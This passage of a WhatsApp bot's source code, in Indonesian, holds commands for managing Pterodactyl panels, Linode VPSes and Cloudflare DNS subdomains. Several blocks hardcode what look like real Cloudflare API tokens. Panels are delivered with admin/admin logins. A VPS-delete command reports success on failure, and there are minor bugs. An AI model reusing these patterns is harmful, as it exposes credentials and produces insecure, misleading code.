kyy.sendMessage(mq1, {text:`*───❖》Bintz Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n`}, m) 
                 }
            break             
case "webpanel":
if (!isCreator) return reply(mess.OnlyOwner)
ewe = `nih kak ${domain}`
await kyy.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
            if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋʏʏ`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL SUSPEND..*')
        }
            break
case 'unsuspend': {
            if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋʏʏ`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
if (!isCreator) return reply('ᴋʜᴜsᴜs ᴋʏʏ')
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
case 'tutorial': {
await loading()
tut = `ᴛᴜᴛᴏʀ ʀᴜɴ ᴘᴀɴᴇʟ ʙʏ ᴋʏʏxᴅ
https://youtu.be/rqqxkI4P8YY`
await kyy.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: tut,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
//=================================================//
case 'backup':
        {
          if (!isCreator) return reply(mess.owner)
     await reply("ᴡᴀɪᴛ ʙᴀᴄᴋᴜᴘ sᴄ ʜᴀɴᴀᴋᴏ ᴠ4.5");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "kyy" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r Kyy.zip ${ls.join(" ")}`);
          await kyy.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./Kyy.zip"),
              mimetype: "application/zip",
              fileName: "hanakov3.7.zip",
            },
            { quoted: fcall }
          );
          await execSync("rm -rf Kayy.zip");
        }
        break
//=================================================//
case 'buatgc': 
case 'creategc':
case 'creategroup': {
if (!isCreator) return reply('Khusus Bintz')
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await kyy.groupCreate(args.join(" "), [])
let response = await kyy.groupInviteCode(cret.id)
let teks2 = `      [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
reply(teks2)
} catch {
reply("sukses!")
}
}
break
case 'pinterest': case 'pin': {
  if (!text) return m.reply(`Nakano Ninoo`);
  //try {
  await m.reply(mess.wait);

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: kyy.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.wm
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.success
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await kyy.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break
// ===================================== //
case 'play':{
if (!text) return m.reply('Ex .play Spiral by longman')
kyy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
const yts = require('yt-search')
const ytdl = require('youtubedl-core')
const mp3File = `./tmp/${Date.now()}.mp3`;
const nok = await yts(text)
const lot = nok
ytdl(lot.videos[0].url, { filter: "audioonly" }).pipe(fs.createWriteStream(mp3File)).on("finish", async () => {
const buffer = fs.readFileSync(mp3File)
kyy.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", }, { quoted: m })
fs.unlinkSync(mp3File)
})
}
break
case "welcome": 
{
if (!isCreator) return m.reply('*khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await kyy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kyy.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break
case 'listonline':
case 'liston': {
if (!m.isGroup) reply("Khusus Grup Wak")
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
kyy.sendText(m.chat, '乂 *LIST ONLINE:*\n\n' + online.map(v => '◦ @' + v.replace(/@.+/, '')).join`\n`, m, {
mentions: online
})
}
break
case 'myip': {
var http = require('http')
 http.get({
 'host': 'api.ipify.org',
 'port': 80,
 'path': '/'
 }, function(resp) {
 resp.on('data', function(ip) {
 m.reply("🔎 My public IP address is: " + ip);
 })
 })}
break
case 'shortlink':{
if (!text) return m.reply('*[ Wrong! ]* harap masukan link/url')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) return m.reply(`*Error: Could not generate a short URL.*`);
let done = `*[ S U C C E S S P R O C E S S]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
m.reply(done)
}
break
 case 'd1': {
 
    if (!isCreator) return reply('Khusus Kyy')
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "5d00f56aee3afd9cc4e0666bc8f23746";
    let apitoken = "mjR4BdiOo6aFO3uPl8BTgZIgOMH3asLbgVsOpEfO";
    let tld = "kedai-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
           case 'd2': {
    if (!isCreator) return reply('Khusus Kyy')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a476ffcf9243c44a02220f184da527e8";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
               let tld = "mypanell.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
           case 'd3': {
    if (!isCreator) return reply('Khusus Kyy')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f374d347f22dc1b0ac208973f185c1f2";
               let apitoken = "m7Xe_0qhlv8enPURlO7UYRSR1-3C7u-uOUkZtvZa";
               let tld = "piwzstoreee.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
  case 'd4': {
   if (!isCreator) return reply('Khusus Kyy')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c1812c92fb249258e67a28573ca34344";
               let apitoken = "mqAjTHuT_GsaZsWcIjbllV-rrrtJHwyVxVeYlL1A";
               let tld = "piwzpediaaa.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
  break       
  
  case 'd5': {
    if (!isCreator) return reply('Khusus Kyy')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3cea2e71ec2bc82ea7865da5999d04b1";
               let apitoken = "eyOrW0eUPe0VxhQzzubXhY1w8X_Z120crfqpsNwL";
               let tld = "piwzpanel.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`Succes Membuat Subdo`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break         
 case 'listproduk': {
 reply(`Kyy Menyediakan----
 - panel
 - vps
 - reseler subdo
 - nokos
 - dll tanyakan saja`)
 }
 break
 case 'vps': {
 reply(` Ready Vps KyyXD
OPEN VPS DIGITAL OCEAN

RAM 1 GB CORE 1 = 15K
RAM 2 GB CORE 1 = 25K
RAM 2 GB CORE 2 = 29K
RAM 4 GB CORE 2 = 35K
RAM 8 GB CORE 4 = 50K
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

*AKTIF 30 HARI*
*GARANSI FULL 30 DAY*
*FREE INSTALL 1X*
*FREE EGG BOT WA,SAMP*
*FREE INSTALL 1X WINGS*
*KUALITAS TERBAIK*
*KUALITAS DO PP, SUDAH TERJAMIN AWET*
*FREE REQ OS,REG,VERSI*
*FREE REQ DOMAIN PTERODATYL*

▬▭▬▭▬▭▬▭▬▭▬▭▬▭ `)
}
break
case 'panel': {
reply(` List? Ke 6288286326619 / Owner`)
}
break
//=================================================//
case "jarak":{
var [fromo, to] = text.split`|`
if (!(fromo && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(fromo, to)
if (data.img) return kyy.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted: m })
else m?.reply(data.desc)
}
break
//=================================================//
case 'gdrive': {
		if (!args[0]) return reply(`Enter the Google Drive link`)
	if (!args[0]) return reply(`Wait`)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	ktt.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break
case "deletelinode": {
  if (!isPrem) return reply(`Buy Prem Dlu Di Kyy Baru Bisa Akses Fitur Ini`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let deleteLinode = async () => {
    try {
      let response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.status === 204) {
        reply('Linode berhasil dihapus.');
      } else {
        throw new Error('Gagal menghapus Linode.');
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus Linode:', error);
      reply('Sukses Menghapus Linode.');
    }
  };

  deleteLinode();

  break;
}
case "sisalinode": {
  if (!isCreator) return reply(mess.owner);

  async function getLinodeInfo() {
    try {
      const response = await fetch('https://api.linode.com/v4/account', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`,
        },
      });

      if (response.ok) {
        const accountInfo = await response.json();
        const linodeLimit = accountInfo.data.active_promo?.total || 0;
        const linodesCount = accountInfo.data.active_promo?.remaining || 0;

        return {
          linodeLimit,
          remainingLinodes: linodesCount,
          totalLinodes: linodeLimit - linodesCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun Linode.');
      }
    } catch (error) {
      throw error;
    }
  }

  // Definisikan fungsi untuk mengeksekusi kasus "sisalinode"
  async function sisalinodeHandler() {
    try {
      if (!isCreator) {
        return reply('Lu Siapanya Gua Anjg');
      }

      const linodeInfo = await getLinodeInfo();
      reply(`*Sisa VPS Linode Yang Dapat Anda Buat: ${linodeInfo.remainingLinodes}*

*Total VPS Linode Yang Sudah Terbuat: ${linodeInfo.totalLinodes}*`);
    } catch (error) {
      reply(`Terjadi kesalahan: ${error.message}`);
    }
  }

  sisalinodeHandler();
  break;
}

            
            
case "rebuildlinode": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let password = args[1]; // Mengambil password dari argumen kedua (jika ada)
  if (!password) return reply('Password belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild VPS menggunakan API Linode
      const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        },
        body: JSON.stringify({
          image: 'linode/ubuntu20.04', // Ganti dengan ID atau label image yang ingin digunakan untuk rebuild
          root_pass: password // Menggunakan password yang diberikan
        })
      });

      if (response.ok) {
        reply('Rebuild VPS berhasil dimulai.');

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const ipAddress = vpsData.ipv4[0] || 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: Ubuntu 20.04\nPASSWORD: ${password}`;
          await sleep(60000);
          kyy.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.errors[0].reason);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error.message);
    }
  };

  rebuildVPS();
  break;
}

case "linode8gb": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-4', // Spesifikasi 8GB RAM 4 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await kyy.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
           
case "linode16gb": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-8',
      image: 'linode/ubuntu20.04',
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await kyy.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
case "cekvpslinode": {
  if (!isCreator) return reply('Maaf, perintah ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  // Mendapatkan informasi VPS Linode berdasarkan ID
  const getLinodeInfo = async (linodeId) => {
    try {
      const apiUrl = `https://api.linode.com/v4/linode/instances/${linodeId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.ok) {
        const linodeInfo = await response.json();

        const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode
        const ram = `${linodeInfo.specs.memory / 1024} GB`; // RAM VPS dalam GB
        const os = linodeInfo.image.distribution; // Nama OS
        const cpu = `${linodeInfo.specs.vcpus} vCPUs`; // Jumlah vCPUs
        const storage = linodeInfo.specs.disk; // Kapasitas penyimpanan
        const status = linodeInfo.status; // Status VPS

        const createDate = new Date(linodeInfo.created); // Tanggal pembuatan VPS
        const formattedCreateDate = createDate.toLocaleDateString();

        return {
          linodeid: linodeInfo.id,
          label: linodeInfo.label,
          ip: ipAddress,
          ram,
          os,
          cpu,
          storage,
          status,
          createDate: formattedCreateDate
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail Linode: ${errorData.errors[0].reason}`);
      }
    } catch (error) {
      throw new Error(`Terjadi kesalahan saat memeriksa detail Linode: ${error.message}`);
    }
  };

  getLinodeInfo(linodeId)
    .then((info) => {
      let textku = `*DETAIL VPS LINODE*\nLinode Id: ${info.linodeid}\nLabel: ${info.label}\nIP: ${info.ip}\nRAM: ${info.ram}\nOS: ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus: ${info.status}\nCreate On: ${info.createDate}\n`;
      kyy.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      kyy.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS Linode.' });
    });

  break;
}


            

case "linode2gb": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
